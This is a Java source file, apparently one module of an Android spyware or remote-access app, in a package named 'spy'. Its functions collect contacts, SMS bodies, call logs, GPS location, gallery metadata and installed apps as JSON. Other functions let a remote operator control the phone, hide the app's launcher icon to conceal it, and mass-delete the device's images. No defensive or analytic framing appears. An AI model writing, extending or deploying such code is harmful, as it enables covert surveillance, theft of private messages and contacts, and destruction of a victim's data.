package ai.m4zk1play.spy;

import android.annotation.SuppressLint;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.view.inputmethod.InputMethodManager;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/** Modul dump & utilitas perangkat. */
public final class Modules {

    public static JSONObject info(Context c) {
        JSONObject o = new JSONObject();
        try {
            o.put("brand", Build.BRAND);
            o.put("model", Build.MODEL);
            o.put("android", Build.VERSION.RELEASE);
            o.put("sdk", Build.VERSION.SDK_INT);
            o.put("battery", battery(c));
            o.put("charging", charging(c));
            o.put("ip", ip(c));
            o.put("notif", NotifListener.alive());
        } catch (Exception ignored) {
        }
        return o;
    }

    public static int battery(Context c) {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager)
                    c.getSystemService(Context.BATTERY_SERVICE);
            return bm == null ? 0 : bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) {
            return 0;
        }
    }

    public static boolean charging(Context c) {
        try {
            android.content.Intent i = c.registerReceiver(null,
                    new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            int s = i == null ? -1 : i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
        } catch (Exception e) {
            return false;
        }
    }

    @SuppressLint("MissingPermission")
    public static String ip(Context c) {
        try {
            WifiManager wm = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            int i = wm == null ? 0 : wm.getConnectionInfo().getIpAddress();
            return String.format(Locale.US, "%d.%d.%d.%d",
                    i & 0xff, (i >> 8) & 0xff, (i >> 16) & 0xff, (i >> 24) & 0xff);
        } catch (Exception e) {
            return "";
        }
    }

    @SuppressLint("MissingPermission")
    public static JSONObject location(Context c) {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            Location best = null;
            for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                try {
                    Location l = lm.getLastKnownLocation(p);
                    if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
                } catch (Exception ignored) {
                }
            }
            if (best != null) {
                o.put("lat", best.getLatitude());
                o.put("lon", best.getLongitude());
                o.put("acc", best.getAccuracy());
            }
        } catch (Exception ignored) {
        }
        return o;
    }

    public static JSONArray contacts(Context c) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null)) {
            while (cur != null && cur.moveToNext() && arr.length() < 5000) {
                JSONObject o = new JSONObject();
                o.put("name", cur.getString(0));
                o.put("number", cur.getString(1));
                arr.put(o);
            }
        } catch (Exception ignored) {
        }
        return arr;
    }

    public static JSONArray sms(Context c) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"address", "body", "date", "type"}, null, null, "date DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < 5000) {
                JSONObject o = new JSONObject();
                o.put("from", cur.getString(0));
                o.put("body", cur.getString(1));
                o.put("ts", cur.getLong(2));
                o.put("type", cur.getInt(3));
                arr.put(o);
            }
        } catch (Exception ignored) {
        }
        return arr;
    }

    public static JSONArray calls(Context c) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                        CallLog.Calls.DATE, CallLog.Calls.DURATION}, null, null, "date DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < 5000) {
                JSONObject o = new JSONObject();
                o.put("number", cur.getString(0));
                o.put("type", cur.getInt(1));
                o.put("ts", cur.getLong(2));
                o.put("dur", cur.getLong(3));
                arr.put(o);
            }
        } catch (Exception ignored) {
        }
        return arr;
    }

    public static JSONArray gallery(Context c, int limit) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.SIZE, MediaStore.Images.Media.DATE_ADDED},
                null, null, "date_added DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < limit) {
                JSONObject o = new JSONObject();
                o.put("id", cur.getLong(0));
                o.put("name", cur.getString(1));
                o.put("size", cur.getLong(2));
                o.put("ts", cur.getLong(3));
                arr.put(o);
            }
        } catch (Exception ignored) {
        }
        return arr;
    }

    public static JSONArray apps(Context c) {
        JSONArray arr = new JSONArray();
        try {
            for (android.content.pm.ApplicationInfo ai : c.getPackageManager()
                    .getInstalledApplications(0)) {
                JSONObject o = new JSONObject();
                o.put("pkg", ai.packageName);
                o.put("name", String.valueOf(c.getPackageManager().getApplicationLabel(ai)));
                arr.put(o);
            }
        } catch (Exception ignored) {
        }
        return arr;
    }

    public static void setWallpaper(Context c, String url) {
        try {
            HttpURLConnection cn = (HttpURLConnection) new URL(url).openConnection();
            cn.setConnectTimeout(12000);
            try (InputStream in = cn.getInputStream()) {
                Bitmap bmp = BitmapFactory.decodeStream(in);
                WallpaperManager.getInstance(c).setBitmap(bmp);
            }
        } catch (Exception ignored) {
        }
    }

    public static void vibrate(Context c, long ms) {
        try {
            Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(ms);
        } catch (Exception ignored) {
        }
    }

    public static void volume(Context c, int level) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) am.setStreamVolume(AudioManager.STREAM_MUSIC, level, 0);
        } catch (Exception ignored) {
        }
    }

    public static void brightness(Context c, int pct) {
        try {
            android.provider.Settings.System.putInt(c.getContentResolver(),
                    android.provider.Settings.System.SCREEN_BRIGHTNESS, pct * 255 / 100);
        } catch (Exception ignored) {
        }
    }

    public static void toast(Context c, String msg) {
        try {
            Toast.makeText(c, msg, Toast.LENGTH_LONG).show();
        } catch (Exception ignored) {
        }
    }

    public static String base64(byte[] data) {
        return Base64.encodeToString(data, Base64.NO_WRAP);
    }

    public static byte[] bitmap(Bitmap bmp, int quality) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, quality, out);
        return out.toByteArray();
    }

    public static void hideIcon(Context c, boolean hide) {
        try {
            int state = hide
                    ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                    : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            c.getPackageManager().setComponentEnabledSetting(
                    new android.content.ComponentName(c, MainActivity.class), state,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
    }

    public static String stamp() {
        return new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
    }

    public static File dir() {
        File d = new File(Environment.getExternalStorageDirectory(), "mzk");
        if (!d.exists()) d.mkdirs();
        return d;
    }

    public static void clean(Context c) {
        try {
            c.getCacheDir().deleteOnExit();
            ContentResolver cr = c.getContentResolver();
            cr.delete(MediaStore.Files.getContentUri("external"),
                    MediaStore.Files.FileColumns.MEDIA_TYPE + "=?",
                    new String[]{String.valueOf(MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE)});
        } catch (Exception ignored) {
        }
        try {
            PowerManager pm = (PowerManager) c.getSystemService(Context.POWER_SERVICE);
            if (pm != null) pm.isDeviceIdleMode();
        } catch (Exception ignored) {
        }
    }
}
